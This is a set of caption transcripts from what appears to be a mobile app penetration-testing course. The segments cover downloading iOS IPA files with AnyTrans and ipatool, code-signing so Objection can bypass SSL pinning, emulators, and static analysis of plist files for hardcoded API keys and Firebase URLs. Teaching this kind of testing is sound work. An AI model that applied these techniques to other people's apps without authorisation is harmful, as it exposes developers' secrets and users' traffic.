00:02:03.400 --> 00:02:06.400
I actually have a team here, my Personal

40
00:02:06.400 --> 00:02:07.759
Development Certificate.

41
00:02:07.840 --> 00:02:09.479
You can see I already have a certificate

42
00:02:09.479 --> 00:02:09.940
here.

43
00:02:10.380 --> 00:02:12.060
But if you were doing this for the

44
00:02:12.060 --> 00:02:14.800
very first time, when you sign into your

45
00:02:14.800 --> 00:02:17.280
Apple ID, it's going to say No Team

46
00:02:17.280 --> 00:02:17.600
here.

47
00:02:17.680 --> 00:02:19.460
You're going to click that, and then you're

48
00:02:19.460 --> 00:02:21.600
going to click this down arrow and click

49
00:02:21.600 --> 00:02:22.580
Apple Development.

50
00:02:29.450 --> 00:02:31.110
Okay, and now you can actually see that

51
00:02:31.110 --> 00:02:34.150
I have a signing certificate here for my

52
00:02:34.150 --> 00:02:34.930
ID.

53
00:02:35.290 --> 00:02:37.230
And you might need to sign up your

54
00:02:37.230 --> 00:02:40.290
Apple ID account for a developer licence when

55
00:02:40.290 --> 00:02:41.990
you do this for the very first time.

56
00:02:42.570 --> 00:02:44.310
So make sure you go through that process.

57
00:02:44.450 --> 00:02:45.870
You're going to have to fill out information

58
00:02:45.870 --> 00:02:49.310
like your organisation ID, your information like that.

59
00:02:50.010 --> 00:02:52.450
And if I go to Manage Certificates here,

60
00:02:52.530 --> 00:02:54.930
we can actually see our different signing certificates.

61
00:02:55.790 --> 00:02:57.130
So these are what we're going to be

62
00:02:57.130 --> 00:02:59.890
actually signing our applications with.

63
00:03:00.170 --> 00:03:01.990
Once you have done all this, and you

64
00:03:01.990 --> 00:03:04.070
have a team here, it doesn't matter how

65
00:03:04.070 --> 00:03:05.810
you name your team or whatever.

66
00:03:06.270 --> 00:03:08.130
You can choose whatever options you want to,

67
00:03:08.190 --> 00:03:10.130
you can name the organisation however you want

68
00:03:10.130 --> 00:03:10.390
to.

69
00:03:10.710 --> 00:03:12.290
This is what we're going to need to

70
00:03:12.290 --> 00:03:14.790
be able to successfully use Objection and actually

71
00:03:14.790 --> 00:03:16.470
make some application changes.

72
00:03:16.810 --> 00:03:19.130
So we can break things like SSL pinning

73
00:03:19.130 --> 00:03:22.210
and sign applications and publish them if we

74
00:03:22.210 --> 00:03:24.450
really wanted to as a developer.

75
00:03:25.210 --> 00:03:27.690
Development licence is totally free.

76
00:03:28.770 --> 00:03:30.130
But if you're going to do this for

77
00:03:30.130 --> 00:03:32.650
a large organisation, you might have, say for

78
00:03:32.650 --> 00:03:36.290
example, a different certificate for your organisation versus

79
00:03:36.290 --> 00:03:37.730
a personal certificate.

80
00:03:38.250 --> 00:03:40.910
So a personal certificate, personal team here is

81
00:03:40.910 --> 00:03:44.050
always going to be a free certificate that

82
00:03:44.050 --> 00:03:45.190
you're going to be able to get when

83
00:03:45.190 --> 00:03:47.310
you actually get a developer account.

84
00:03:47.750 --> 00:03:49.830
So you can sign applications, test them, and

85
00:03:49.830 --> 00:03:50.850
everything like that.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.010 --> 00:00:02.790
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, a tool we can use to pull

2
00:00:02.790 --> 00:00:06.070
IPAs off of the Mac Play Store or

3
00:00:06.070 --> 00:00:08.650
the Apple Play Store is a tool called

4
00:00:08.650 --> 00:00:09.270
AnyTrans.

5
00:00:09.770 --> 00:00:12.210
Now there are also some websites out there

6
00:00:12.210 --> 00:00:15.309
where you can pull an IPA off of

7
00:00:15.309 --> 00:00:18.230
the Apple Store as well, they provide those.

8
00:00:18.650 --> 00:00:20.930
Nothing says that that is not a legitimate

9
00:00:20.930 --> 00:00:23.410
way, but in terms of this course I

10
00:00:23.410 --> 00:00:25.330
just want to talk about this product right

11
00:00:25.330 --> 00:00:26.670
here called AnyTrans.

12
00:00:26.870 --> 00:00:29.150
It allows you to manage your Apple products,

13
00:00:29.330 --> 00:00:30.810
it's kind of like an all-in-one

14
00:00:30.810 --> 00:00:31.729
management portal.

15
00:00:32.390 --> 00:00:34.890
Now the cool thing about AnyTrans is that

16
00:00:34.890 --> 00:00:38.130
it actually comes with a free pricing model,

17
00:00:38.370 --> 00:00:40.990
so you can click free download and utilize

18
00:00:40.990 --> 00:00:41.730
this tool.

19
00:00:42.110 --> 00:00:44.690
I'm going to click download here and what's

20
00:00:44.690 --> 00:00:47.370
going to be nice about AnyTrans is that

21
00:00:47.370 --> 00:00:50.630
it's going to allow us to enter our

22
00:00:50.630 --> 00:00:53.190
Apple ID in there and it's also going

23
00:00:53.190 --> 00:00:56.310
to allow us to pull applications off of

24
00:00:56.310 --> 00:00:59.550
our phone after we have downloaded them successfully.

25
00:01:00.430 --> 00:01:02.330
So this can also help you do a

26
00:01:02.330 --> 00:01:04.550
lot of different things with your iPhone like

27
00:01:04.550 --> 00:01:07.150
backups, data transfers, things like that.

28
00:01:07.550 --> 00:01:10.310
Now there's obviously a big risk with using

29
00:01:10.310 --> 00:01:13.210
this tool called AnyTrans and that's because we

30
00:01:13.210 --> 00:01:15.870
have to actually provide our Apple ID and

31
00:01:15.870 --> 00:01:16.370
password.

32
00:01:16.370 --> 00:01:20.950
Now it says in their documentation that that

33
00:01:20.950 --> 00:01:23.770
information is not saved by the tool, but

34
00:01:23.770 --> 00:01:26.210
I would definitely recommend using some kind of

35
00:01:26.210 --> 00:01:31.690
a burner iCloud account just in case this

36
00:01:31.690 --> 00:01:34.350
tool does actually track that information.

37
00:01:34.970 --> 00:01:37.470
They claim that it's not going to be

38
00:01:37.470 --> 00:01:40.310
like that, but I would say it's not

39
00:01:40.310 --> 00:01:42.150
necessarily 100% true.

40
00:01:42.470 --> 00:01:45.290
There's also some websites out there, you just

41
00:01:45.290 --> 00:01:46.910
have to do a quick Google search on

42
00:01:46.910 --> 00:01:51.810
them, like IPA downloads and it will actually,

43
00:01:53.170 --> 00:01:56.170
you know, like iOS Ninja here, allow you

44
00:01:56.170 --> 00:01:59.710
to download IPA files off of these different

45
00:01:59.710 --> 00:02:02.150
websites and also some tweaks that you could

46
00:02:02.150 --> 00:02:04.250
utilize when we get to the jailbreaking section

47
00:02:04.250 --> 00:02:05.310
of these videos.

48
00:02:05.790 --> 00:02:08.449
I have personally just used AnyTrans because I

49
00:02:08.449 --> 00:02:11.350
find it as a pretty convenient tool and

50
00:02:11.350 --> 00:02:12.630
it's nice to use, but I just want

51
00:02:12.630 --> 00:02:14.370
to give you a few different options out

52
00:02:14.370 --> 00:02:16.830
there to be able to get these IPA

53
00:02:16.830 --> 00:02:17.150
files.

54
00:02:17.310 --> 00:02:18.970
So you can do a local analysis, kind

55
00:02:18.970 --> 00:02:20.310
of similar to what we did in the

56
00:02:20.310 --> 00:02:22.430
Android portion of the course, where we want

57
00:02:22.430 --> 00:02:25.810
to have these files locally so we can

58
00:02:25.810 --> 00:02:28.570
do our local analysis and our static analysis,

59
00:02:28.730 --> 00:02:28.950
right?

60
00:02:29.470 --> 00:02:31.590
So I'm going to click open here on

61
00:02:31.590 --> 00:02:35.270
the AnyTrans iOS DMG here and open up

62
00:02:35.270 --> 00:02:37.170
that file and install the tool.

63
00:02:38.110 --> 00:02:40.470
Okay, now let's show how you can actually

64
00:02:40.470 --> 00:02:42.670
download an application using AnyTrans.

65
00:02:43.090 --> 00:02:45.230
So here you can see I have AnyTrans

66
00:02:45.230 --> 00:02:45.670
open.

67
00:02:45.810 --> 00:02:48.730
I actually have my iPhone connected to AnyTrans

68
00:02:48.730 --> 00:02:49.050
now.

69
00:02:49.410 --> 00:02:52.290
You can see that my iPhone is an

70
00:02:52.290 --> 00:02:53.090
iPhone 7.

71
00:02:53.650 --> 00:02:55.870
I have a 32 gigs of 32 gigs

72
00:02:55.870 --> 00:02:59.350
used and it's on version 14.7.1.

73
00:02:59.570 --> 00:03:01.390
On the right here you can see all

74
00:03:01.390 --> 00:03:03.490
the different applications and things I have on

75
00:03:03.490 --> 00:03:05.770
here, iTunes U, voicemail, etc.

76
00:03:06.310 --> 00:03:08.330
Now if I actually go to the iPhone,

77
00:03:08.530 --> 00:03:10.950
let's say that I wanted to download an

78
00:03:10.950 --> 00:03:12.130
application here.

79
00:03:12.570 --> 00:03:14.690
In this case, you know what, here's Sunbelt

80
00:03:14.690 --> 00:03:15.190
Rentals.

81
00:03:15.250 --> 00:03:16.410
Let's just do that one.

82
00:03:16.690 --> 00:03:18.230
I'm going to click get here on the

83
00:03:18.230 --> 00:03:19.950
phone, click install.

84
00:03:20.730 --> 00:03:23.090
This will install the application to my phone

85
00:03:23.090 --> 00:03:25.950
and I'll say not now for my free

86
00:03:25.950 --> 00:03:26.790
items here.

87
00:03:27.330 --> 00:03:28.610
It's going to take just a second to

88
00:03:28.610 --> 00:03:33.010
download the application, but since we actually ask

89
00:03:33.010 --> 00:03:36.950
the app store for this through our phone,

90
00:03:37.110 --> 00:03:38.950
we'll actually be able to download this through

91
00:03:38.950 --> 00:03:40.310
AnyTrans as well.

92
00:03:40.770 --> 00:03:41.870
So if we go down here to the

93
00:03:41.870 --> 00:03:45.110
little app store icon and now if I

94
00:03:45.110 --> 00:03:47.130
wanted to get the Sunbelt app, for example,

95
00:03:47.530 --> 00:03:48.790
all I got to do is type in

96
00:03:48.790 --> 00:03:54.490
Sunbelt and it says Sunbelt Rentals here.

97
00:03:54.570 --> 00:03:55.590
I'm going to click download.

98
00:03:55.910 --> 00:03:57.410
I'm going to throw in my Apple ID

99
00:03:57.410 --> 00:04:06.880
and password here and it's going to start

100
00:04:06.880 --> 00:04:08.180
downloading that application.

101
00:04:14.930 --> 00:04:16.209
Okay, so you can see it in the

102
00:04:16.209 --> 00:04:16.750
app store.

103
00:04:17.589 --> 00:04:20.269
You can see some other applications I was

104
00:04:20.269 --> 00:04:22.930
playing around with previously for my work, but

105
00:04:22.930 --> 00:04:25.510
you can see the Sunbelt Rentals application right

106
00:04:25.510 --> 00:04:28.230
here and this will actually be stored and

107
00:04:28.230 --> 00:04:30.590
we can actually click this to Mac icon

108
00:04:30.590 --> 00:04:33.250
here and that's going to save that locally

109
00:04:33.250 --> 00:04:34.830
to our Mac computer.

110
00:04:35.250 --> 00:04:36.590
In my case, I'll just save it right

111
00:04:36.590 --> 00:04:39.970
here in our documents and now it says

112
00:04:39.970 --> 00:04:41.210
the transfer is completed.

113
00:04:41.410 --> 00:04:42.930
I'm going to view the files here in

114
00:04:42.930 --> 00:04:44.970
the file explorer and we can see now

115
00:04:44.970 --> 00:04:48.230
that we have the SunbeltRentals.ipa. So now

116
00:04:48.230 --> 00:04:50.050
we're all good to go and we actually

117
00:04:50.050 --> 00:04:52.630
have a copy of the application for our

118
00:04:52.630 --> 00:04:55.590
local static analysis and it can be any

119
00:04:55.590 --> 00:04:58.490
application that is found on the Apple store.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.390 --> 00:00:03.250
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Welcome back everyone to the mobile application penetration

2
00:00:03.250 --> 00:00:05.930
tester course and here i wanted to make

3
00:00:05.930 --> 00:00:08.090
a quick video update on a new tool

4
00:00:08.090 --> 00:00:10.590
we can actually use to download apps from

5
00:00:10.590 --> 00:00:13.170
the app store and this tool is called

6
00:00:13.170 --> 00:00:15.410
IPA tool all you have to do is

7
00:00:15.410 --> 00:00:18.130
look it up on google IPA tool github

8
00:00:18.130 --> 00:00:19.850
and it will take you to this page

9
00:00:19.850 --> 00:00:23.070
now the only prerequisite we need here to

10
00:00:23.070 --> 00:00:26.710
install this tool is homebrew installed so if

11
00:00:26.710 --> 00:00:29.630
you've not installed homebrew on your machine yet

12
00:00:29.630 --> 00:00:31.650
please take a second and go ahead and

13
00:00:31.650 --> 00:00:33.290
do that you can pause the video now

14
00:00:33.290 --> 00:00:35.370
all you need to do is copy this

15
00:00:35.370 --> 00:00:37.870
out of the homebrew home page and install

16
00:00:37.870 --> 00:00:40.990
it on your machine once we have brew

17
00:00:40.990 --> 00:00:43.030
installed then we're going to use these commands

18
00:00:43.030 --> 00:00:45.410
to add this tool to our repo so

19
00:00:45.410 --> 00:00:48.750
copy this and paste i do already have

20
00:00:48.750 --> 00:00:51.090
this tool installed here you would just press

21
00:00:51.090 --> 00:00:54.470
enter so brew tap mash d repo as

22
00:00:54.470 --> 00:00:57.830
that repo into your available taps and then

23
00:00:57.830 --> 00:01:00.330
you can go here and do brew install

24
00:01:00.330 --> 00:01:04.890
ipa tool paste that into the shell and

25
00:01:04.890 --> 00:01:08.850
you press enter here again so brew install

26
00:01:08.850 --> 00:01:13.130
ipa tool okay and once you have everything

27
00:01:13.130 --> 00:01:16.710
installed successfully you can use the command ipa

28
00:01:16.710 --> 00:01:22.010
tool to actually show the tool itself and

29
00:01:22.010 --> 00:01:24.090
how this kind of works it's a little

30
00:01:24.090 --> 00:01:27.850
bit complicated from the manual but to authenticate

31
00:01:27.850 --> 00:01:29.410
the tool all you have to do is

32
00:01:29.410 --> 00:01:33.130
ipa tool auth login and then we can

33
00:01:33.130 --> 00:01:34.970
provide it an email address so in this

34
00:01:34.970 --> 00:01:39.670
case this is my email address i'm going

35
00:01:39.670 --> 00:01:41.190
to say enter your password so this is

36
00:01:41.190 --> 00:01:46.830
your apple id password okay and then if

37
00:01:46.830 --> 00:01:48.890
this is your first time ever using this

38
00:01:48.890 --> 00:01:50.650
tool it's going to ask you for a

39
00:01:50.650 --> 00:01:53.190
2fa code you can see here that i

40
00:01:53.190 --> 00:01:56.790
have successfully logged in but if you're logging

41
00:01:56.790 --> 00:01:58.690
into this for the first time on an

42
00:01:58.690 --> 00:02:01.510
iphone or your macbook whatever you're logging into

43
00:02:01.510 --> 00:02:04.510
a 2fa code will be present and will

44
00:02:04.510 --> 00:02:06.990
ask you to provide that 2fa code so

45
00:02:06.990 --> 00:02:10.710
this bypasses apple two-factor authentication in a

46
00:02:10.710 --> 00:02:13.190
way you're still authenticating yourself and the tool

47
00:02:13.190 --> 00:02:16.110
does not save your credentials so it is

48
00:02:16.110 --> 00:02:19.090
legitimately using the same 2fa that all the

49
00:02:19.090 --> 00:02:23.990
apple software and hardware uses all right so

50
00:02:23.990 --> 00:02:26.330
next we're going to actually search for an

51
00:02:26.330 --> 00:02:27.750
app right and you can see we do

52
00:02:27.750 --> 00:02:31.110
this ipa tool search dash dash limit would

53
00:02:31.110 --> 00:02:33.030
be limiting the results and then you can

54
00:02:33.030 --> 00:02:36.090
look for the name of the app so

55
00:02:36.090 --> 00:02:38.450
if i was looking for i mean we

56
00:02:38.450 --> 00:02:39.930
could do the test flight app as well

57
00:02:39.930 --> 00:02:43.570
i would go ipa tool search okay and

58
00:02:43.570 --> 00:02:48.350
let's say test flight and it's going to

59
00:02:48.350 --> 00:02:55.010
ask me for my password again this is

60
00:02:55.010 --> 00:02:57.770
the password of my macbook and you can

61
00:02:57.770 --> 00:02:59.470
see here we have a bunch of different

62
00:02:59.470 --> 00:03:03.190
things so this com.apple.testflight would be

63
00:03:03.190 --> 00:03:04.990
the original one and again if you want

64
00:03:04.990 --> 00:03:07.510
to limit this you could use that dash

65
00:03:07.510 --> 00:03:09.470
dash limit flag so if we wanted to

66
00:03:09.470 --> 00:03:15.910
limit this to results i'm going to click

67
00:03:15.910 --> 00:03:19.710
always allow here it only gives us back

68
00:03:19.710 --> 00:03:21.970
two results so this is we're actually querying

69
00:03:21.970 --> 00:03:25.210
against the apple app store and looking for

70
00:03:25.210 --> 00:03:29.610
whatever keys keywords we're looking for for our

71
00:03:29.610 --> 00:03:31.910
app right okay so next if we wanted

72
00:03:31.910 --> 00:03:34.270
to download this locally we can just copy

73
00:03:34.270 --> 00:03:37.150
this bundle id out of the json and

74
00:03:37.150 --> 00:03:41.170
you're going to go ipa tool download okay

75
00:03:41.170 --> 00:03:44.910
and just like they're showing in here so

76
00:03:44.910 --> 00:03:47.430
one second let's let this gif go back

77
00:03:47.430 --> 00:03:51.630
ipa tool download okay dash dash bundle id

78
00:03:51.630 --> 00:03:54.690
identifier and then the name that we pulled

79
00:03:54.690 --> 00:03:57.810
out of that json so ipa tool dash

80
00:03:57.810 --> 00:04:04.760
dash bundle dash identifier and then the name

81
00:04:04.760 --> 00:04:06.360
of this that we pulled out there the

82
00:04:06.360 --> 00:04:09.160
bundle id so in this case com.apple

83
00:04:09.160 --> 00:04:15.339
.testflight and just press enter and this will

84
00:04:15.339 --> 00:04:18.000
download the app to our machine and if

85
00:04:18.000 --> 00:04:21.280
i do an ls now we can see

86
00:04:21.280 --> 00:04:25.000
i have com.apple.testflight .ipa so now

87
00:04:25.000 --> 00:04:26.700
that we have the ipa file we can

88
00:04:26.700 --> 00:04:28.800
go ahead and do our static analysis or

89
00:04:28.800 --> 00:04:30.800
we can install it on whatever phones we

90
00:04:30.800 --> 00:04:34.080
want and this is a great tool for

91
00:04:34.080 --> 00:04:37.680
pulling down apps legitimately using 2fa so i

92
00:04:37.680 --> 00:04:39.980
definitely recommend you look into it if any

93
00:04:39.980 --> 00:04:42.540
trans is not working for you definitely go

94
00:04:42.540 --> 00:04:44.520
ahead and use this tool because this one

95
00:04:44.520 --> 00:04:47.200
is working successfully and works really well and

96
00:04:47.200 --> 00:04:49.680
it's pretty easy to use a couple more

97
00:04:49.680 --> 00:04:52.240
notes on the tool itself you can do

98
00:04:52.240 --> 00:04:53.780
a few more things so like you can

99
00:04:53.780 --> 00:04:56.100
do ipa tool off here revoke if you

100
00:04:56.100 --> 00:04:58.460
want to revoke your app store credentials so

101
00:04:58.460 --> 00:05:01.020
no one else can use them you can

102
00:05:01.020 --> 00:05:03.460
also go and search so there are some

103
00:05:03.460 --> 00:05:06.880
other flags here for searching so for most

104
00:05:06.880 --> 00:05:09.420
logs you have limiting the amount of results

105
00:05:09.420 --> 00:05:12.220
you can also do ipa tool purchase so

106
00:05:12.220 --> 00:05:14.700
you can purchase apps here so if there's

107
00:05:14.700 --> 00:05:16.460
an app that costs money you can use

108
00:05:16.460 --> 00:05:18.160
this to actually buy the app as well

109
00:05:18.160 --> 00:05:20.860
and you can download the app as well

110
00:05:20.860 --> 00:05:23.740
so this will download the encrypted version of

111
00:05:23.740 --> 00:05:25.760
the ios app you can still do your

112
00:05:25.760 --> 00:05:27.700
static analysis on there but you will not

113
00:05:27.700 --> 00:05:30.840
be able to actually inject it with objection

114
00:05:30.840 --> 00:05:32.640
if you do get the ipa out of

115
00:05:32.640 --> 00:05:35.040
here i definitely recommend using the jailbreaking videos

116
00:05:35.040 --> 00:05:38.180
and ssl kill switch to actually intercept the

117
00:05:38.180 --> 00:05:41.360
application traffic so that's everything here for this

118
00:05:41.360 --> 00:05:44.100
course update i hope you enjoy the ipa

119
00:05:44.100 --> 00:05:45.720
tool and i hope that this helps you

120
00:05:45.720 --> 00:05:47.640
to pull apps down from the play store

121
00:05:47.640 --> 00:05:48.100
successfully


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.010 --> 00:00:03.130
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Before we move on to additional iOS static

2
00:00:03.130 --> 00:00:05.270
analysis, I wanted to take a moment and

3
00:00:05.270 --> 00:00:08.690
highlight two additional emulating tools you might want

4
00:00:08.690 --> 00:00:10.570
to use if you don't like the ones

5
00:00:10.570 --> 00:00:11.730
I've used in this course.

6
00:00:11.870 --> 00:00:13.730
Now for the course, I'll only be showing

7
00:00:13.730 --> 00:00:17.270
Xcode as our emulation tool, but there are

8
00:00:17.270 --> 00:00:19.370
two other tools out here that might be

9
00:00:19.370 --> 00:00:20.470
pretty useful to you.

10
00:00:21.170 --> 00:00:23.390
Corellium is one of those, and this is

11
00:00:23.390 --> 00:00:27.010
a paid platform, basically there's a pricing model

12
00:00:27.010 --> 00:00:29.270
here on their website, and you kind of

13
00:00:29.270 --> 00:00:30.490
pay by the hour.

14
00:00:30.730 --> 00:00:32.170
So you can see that it's like 25

15
00:00:32.170 --> 00:00:33.190
cents per hour.

16
00:00:33.690 --> 00:00:35.750
They also have different devices that you can

17
00:00:35.750 --> 00:00:37.870
pay for on a monthly basis.

18
00:00:38.390 --> 00:00:41.150
I personally have never used Corellium, but I

19
00:00:41.150 --> 00:00:43.290
have heard that this is a good emulator

20
00:00:43.290 --> 00:00:45.810
tool as well if you're not looking to

21
00:00:45.810 --> 00:00:48.030
use Xcode or you're looking for some kind

22
00:00:48.030 --> 00:00:49.830
of other alternative device.

23
00:00:50.850 --> 00:00:53.610
Another website I would recommend looking into is

24
00:00:53.610 --> 00:00:56.130
this appetize.io website.

25
00:00:56.650 --> 00:00:58.090
What's kind of nice about this is that

26
00:00:58.090 --> 00:01:00.430
you can actually run your mobile app in

27
00:01:00.430 --> 00:01:01.190
the web browser.

28
00:01:01.730 --> 00:01:04.310
So here on the appetize.io website, if

29
00:01:04.310 --> 00:01:06.510
I click this start demo button, it's actually

30
00:01:06.510 --> 00:01:08.150
going to launch the demo.

31
00:01:08.330 --> 00:01:09.970
I can click the demo here and scroll

32
00:01:09.970 --> 00:01:11.870
down, and you can see all the different

33
00:01:11.870 --> 00:01:14.190
types of iPhone simulators there are.

34
00:01:14.730 --> 00:01:17.230
This is like the zoom percentage here, the

35
00:01:17.230 --> 00:01:20.090
type of simulator, also they have Android devices

36
00:01:20.090 --> 00:01:23.590
as well, iOS version, and the different colours

37
00:01:23.590 --> 00:01:24.650
of the iOS device.

38
00:01:24.650 --> 00:01:26.950
You also have these cool things right here

39
00:01:26.950 --> 00:01:28.590
where you can just toggle the debug log

40
00:01:28.590 --> 00:01:30.650
on and network intercept as well.

41
00:01:31.250 --> 00:01:32.670
And so if we click tap to play,

42
00:01:32.810 --> 00:01:35.530
this demo is only about 60 seconds long

43
00:01:35.530 --> 00:01:37.670
where you can mess with the actual demo.

44
00:01:43.240 --> 00:01:44.600
Let me try reloading here.

45
00:01:45.500 --> 00:01:47.360
Okay, so here is the demo starting.

46
00:01:47.500 --> 00:01:48.580
You can see it just kind of goes

47
00:01:48.580 --> 00:01:51.080
to wikipedia.com, but I'm sure you could

48
00:01:51.080 --> 00:01:53.920
also instal your own applications onto this once

49
00:01:53.920 --> 00:01:55.840
you pay for the platform, but if we

50
00:01:55.840 --> 00:01:58.080
go to Wikipedia and we actually go down,

51
00:01:58.180 --> 00:01:59.860
we can actually see all of the network

52
00:01:59.860 --> 00:02:02.720
requests here in the network log, and if

53
00:02:02.720 --> 00:02:04.680
we go down, we can also see things

54
00:02:04.680 --> 00:02:05.680
like the debug log.

55
00:02:06.140 --> 00:02:07.940
So it's actually really nice from that perspective

56
00:02:07.940 --> 00:02:10.000
if you want to have everything in a

57
00:02:10.000 --> 00:02:13.040
web browser, appetize.io might be a good

58
00:02:13.040 --> 00:02:14.540
solution for you as well.

59
00:02:15.100 --> 00:02:16.400
Here is a little bit of the pricing.

60
00:02:16.600 --> 00:02:19.520
There's a free trial here for one session,

61
00:02:19.660 --> 00:02:22.140
100 minutes per month, so that's a little

62
00:02:22.140 --> 00:02:24.660
bit over an hour and 40 minutes for

63
00:02:24.660 --> 00:02:25.220
a month.

64
00:02:25.220 --> 00:02:28.100
Then you have your basic premium and enterprise

65
00:02:28.100 --> 00:02:28.980
plans as well.

66
00:02:29.340 --> 00:02:30.580
So I just want to throw these two

67
00:02:30.580 --> 00:02:33.700
tools out there as additional emulation options if

68
00:02:33.700 --> 00:02:35.700
you're not interested in using Xcode.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

==================================================================================

# Section 11: iOS-Static-Analysis

WEBVTT

1
00:00:00.010 --> 00:00:02.230
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, so how can we start doing a

2
00:00:02.230 --> 00:00:05.030
static analysis on our application if we're not

3
00:00:05.030 --> 00:00:07.610
really able to open the IPA file using

4
00:00:07.610 --> 00:00:08.190
Xcode?

5
00:00:08.650 --> 00:00:10.390
Well, a cool trick we can use with

6
00:00:10.390 --> 00:00:12.730
these IPA files is we can make a

7
00:00:12.730 --> 00:00:13.070
duplicate.

8
00:00:13.410 --> 00:00:15.850
So, for example, let's say I was looking

9
00:00:15.850 --> 00:00:19.310
at this sunbeltrentals.ipa that we downloaded earlier.

10
00:00:19.750 --> 00:00:21.570
I'm going to make a duplicate of the

11
00:00:21.570 --> 00:00:22.250
file here.

12
00:00:23.430 --> 00:00:25.710
And something simple we can actually do is

13
00:00:25.710 --> 00:00:29.910
just rename this file to be payload.zip.

14
00:00:30.010 --> 00:00:32.370
This will work for any IPA file.

15
00:00:32.430 --> 00:00:33.830
You need to name it in this way,

16
00:00:34.130 --> 00:00:36.470
payload.zip. I'm just going to click enter

17
00:00:36.470 --> 00:00:40.730
here and click use.zip. So, every IPA

18
00:00:40.730 --> 00:00:44.150
file is really just a bundled package of

19
00:00:44.150 --> 00:00:44.710
resources.

20
00:00:45.030 --> 00:00:46.930
And if we rename it to payload.zip,

21
00:00:47.210 --> 00:00:49.950
it will allow us to actually extract information

22
00:00:49.950 --> 00:00:51.230
out of the application.

23
00:00:51.730 --> 00:00:54.310
It's going to expand this payload.zip folder

24
00:00:54.310 --> 00:00:56.210
out into a payload folder.

25
00:00:56.210 --> 00:00:58.970
So, here we have our payload folder now.

26
00:00:59.630 --> 00:01:00.910
I'm going to double click in here.

27
00:01:01.370 --> 00:01:03.349
Now we can see some basic information.

28
00:01:03.569 --> 00:01:04.730
So, if I go to like meta-inf

29
00:01:04.730 --> 00:01:07.990
here, you can see we have a zipmetadata

30
00:01:07.990 --> 00:01:09.270
.plist here.

31
00:01:10.290 --> 00:01:12.310
It doesn't really have that much information.

32
00:01:13.110 --> 00:01:15.070
I'm going to go back and go to

33
00:01:15.070 --> 00:01:17.890
this new payload folder here inside of our

34
00:01:17.890 --> 00:01:19.010
other payload folder.

35
00:01:19.750 --> 00:01:23.150
And now we see this sunbeltrentals.app. If

36
00:01:23.150 --> 00:01:25.450
we wanted to see the information that's actually

37
00:01:25.450 --> 00:01:28.250
contained in here, it's very simple with a

38
00:01:28.250 --> 00:01:28.570
Mac.

39
00:01:29.250 --> 00:01:32.650
We can just control click this and click

40
00:01:32.650 --> 00:01:34.270
show package contents.

41
00:01:35.190 --> 00:01:36.750
And this is going to open up the

42
00:01:36.750 --> 00:01:39.390
application and all of its files and everything

43
00:01:39.390 --> 00:01:39.950
like that.

44
00:01:40.250 --> 00:01:41.930
So, now you can actually see some of

45
00:01:41.930 --> 00:01:44.970
the different fonts that are being used here

46
00:01:44.970 --> 00:01:45.930
by the application.

47
00:01:46.530 --> 00:01:49.010
You can also see the info.plist file.

48
00:01:49.150 --> 00:01:50.910
Now, this file is very important.

49
00:01:50.910 --> 00:01:53.590
We're going to double click the info.plist

50
00:01:53.590 --> 00:01:55.370
and just take a quick look here.

51
00:01:55.590 --> 00:01:57.670
It's going to open that file up in

52
00:01:57.670 --> 00:01:58.190
Xcode.

53
00:01:58.330 --> 00:02:00.930
We can actually look at the info.plist.

54
00:02:01.210 --> 00:02:03.650
And this file is kind of similar to

55
00:02:03.650 --> 00:02:07.350
what we had with the androidmanifest.xml. This

56
00:02:07.350 --> 00:02:10.009
is where a lot of the basic application

57
00:02:10.009 --> 00:02:11.470
information is stored.

58
00:02:11.910 --> 00:02:14.150
You can see we have things like the

59
00:02:14.150 --> 00:02:19.090
platform version, bundle name, the SDK name here.

60
00:02:19.090 --> 00:02:22.110
We could possibly find some strings or anything

61
00:02:22.110 --> 00:02:22.610
like that.

62
00:02:22.690 --> 00:02:25.610
We can see this DTXBeacon URL, something that

63
00:02:25.610 --> 00:02:27.230
is being used by the application.

64
00:02:27.710 --> 00:02:29.890
You can also see some information like the

65
00:02:29.890 --> 00:02:36.450
firebase, json, possibly some type of a hardcoded

66
00:02:36.450 --> 00:02:38.270
secret here, something like that.

67
00:02:38.550 --> 00:02:40.930
You can also find other information.

68
00:02:41.250 --> 00:02:43.930
If we click down here, fonts provided by

69
00:02:43.930 --> 00:02:44.750
the application.

70
00:02:45.730 --> 00:02:47.750
So, maybe some special fonts that they're using

71
00:02:47.750 --> 00:02:48.730
for the application.

72
00:02:49.190 --> 00:02:52.130
Take a look through this entire info.plist

73
00:02:52.130 --> 00:02:54.270
file and look for anything that might be

74
00:02:54.270 --> 00:02:58.070
stored insecurely or, you know, like a hardcoded

75
00:02:58.070 --> 00:03:01.030
password, username, anything like that that might be

76
00:03:01.030 --> 00:03:02.570
utilized by the application.

77
00:03:03.130 --> 00:03:04.590
This is definitely a file that you would

78
00:03:04.590 --> 00:03:05.850
want to take a look at.

79
00:03:05.930 --> 00:03:07.950
We'll see the info.plist come back.

80
00:03:08.270 --> 00:03:10.470
We'll take a look at this application through

81
00:03:10.470 --> 00:03:11.910
mobSF as well.

82
00:03:12.950 --> 00:03:13.390
Okay.

83
00:03:13.590 --> 00:03:15.450
Other things that are in here, anything that

84
00:03:15.450 --> 00:03:17.490
is really like a plist file here, you're

85
00:03:17.490 --> 00:03:18.850
going to want to just take a look

86
00:03:18.850 --> 00:03:19.170
through.

87
00:03:19.690 --> 00:03:23.010
So, for example, we have the GoogleServiceInfo.plist

88
00:03:23.010 --> 00:03:23.230
here.

89
00:03:23.310 --> 00:03:25.130
This could give us some information about the

90
00:03:25.130 --> 00:03:27.970
different Google services being utilized.

91
00:03:28.070 --> 00:03:29.590
You can see here now we have our

92
00:03:29.590 --> 00:03:31.250
firebase database URL.

93
00:03:31.750 --> 00:03:34.270
Also have things like the client IDs and

94
00:03:34.270 --> 00:03:37.630
Google app IDs, API keys, things like that.

95
00:03:37.950 --> 00:03:40.110
So, that can be a useful target for

96
00:03:40.110 --> 00:03:42.350
you as well to do some static analysis

97
00:03:42.350 --> 00:03:45.390
and find some URLs or possibly API keys.

98
